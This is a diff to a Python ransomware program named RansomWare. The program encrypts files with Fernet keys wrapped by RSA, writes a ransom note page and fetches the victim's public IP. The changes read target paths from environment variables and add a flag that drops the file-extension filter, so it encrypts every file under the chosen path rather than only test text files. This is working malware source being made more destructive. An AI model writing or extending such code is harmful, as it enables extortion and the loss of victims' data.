@@ -14,8 +14,16 @@ import threading  # used for ransom note and decryption key on desktop
 from cryptography.fernet import Fernet  # encrypt/decrypt files on target system
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+from dotenv import load_dotenv
+
+load_dotenv()
 
 os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"
+
+PROJECT_NAME = os.getenv('PROJECT_NAME')
+DESKTOP_PATH = os.getenv('DESKTOP_PATH')
+ENCRYPT_C_DRIVE = os.getenv('ENCRYPT_C_DRIVE') == "True"
+ENCRYPTION_PATH = os.getenv('ENCRYPTION_PATH')
 
 
 class RansomWare:
@@ -23,9 +31,6 @@ class RansomWare:
     # File extensions to seek out and Encrypt
     file_exts = [
         'txt',
-        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
-        # -and leaves other files un-ecnrypted etc.
-        # 'png',
     ]
 
     def __init__(self):
@@ -45,7 +50,8 @@ class RansomWare:
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption software and for absolute path for files and encryption of
         # "test system"
-        self.localRoot = r'C:\Users\Maaz\Documents\Python-Ransomware\localRoot'  # Debugging/Testing
+        # self.localRoot = f'{DESKTOP_PATH}\\{PROJECT_NAME}\localRoot'  # Debugging/Testing
+        self.localRoot = f'{ENCRYPTION_PATH}'
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -72,7 +78,7 @@ class RansomWare:
             # Public RSA key
             self.public_key = RSA.import_key(open('public.pem').read())
             # Public encrypter object
-            public_crypter =  PKCS1_OAEP.new(self.public_key)
+            public_crypter = PKCS1_OAEP.new(self.public_key)
             # Encrypted fernet key
             enc_fernent_key = public_crypter.encrypt(fernet_key)
             # Write encrypted fernet key to file
@@ -118,8 +124,9 @@ class RansomWare:
         for root, dir, files in system:
             for file in files:
                 file_path = os.path.join(root, file)
-                if not file.split('.')[-1] in self.file_exts:
-                    continue
+                if not ENCRYPT_C_DRIVE:
+                    if not file.split('.')[-1] in self.file_exts:
+                        continue
                 if not encrypted:
                     self.crypt_file(file_path)
                 else:
@@ -131,7 +138,7 @@ class RansomWare:
         filename = 'ransom.html'
 
         # URL of the image you want to display
-        image_url = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
+        image_url = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r"\bot.jpg"
 
         # Define specific width and height for the image
         image_width = "400"  # Width in pixels
@@ -311,4 +318,3 @@ def main():
 
 if __name__ == '__main__':
     main()
- 
